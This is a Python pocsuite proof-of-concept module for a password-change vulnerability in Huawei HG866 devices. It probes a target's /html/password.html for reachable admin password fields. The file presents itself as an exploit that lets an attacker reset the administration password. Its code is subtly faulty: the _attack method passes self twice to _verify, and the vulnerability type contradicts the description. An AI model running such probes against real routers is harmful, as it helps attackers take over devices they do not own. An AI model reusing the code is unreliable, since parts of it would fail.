#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import re

class TestPOC(POCBase):
    name = "Huawei HG866 Password Cahnge"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/19185/'
    desc = 'Module exploits password change vulnerability in Huawei HG866 devices.If the target is vulnerable it allows to change administration password.'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = 'huawei'
    appVersion = 'Huawei HG866'
    dork = ''
    appPowerLink = 'http://www.huawei.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = self.url+ '/html/password.html'
        resp = req.get(url)
        if resp.status_code == 200 and "psw" in resp.content and "reenterpsw" in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
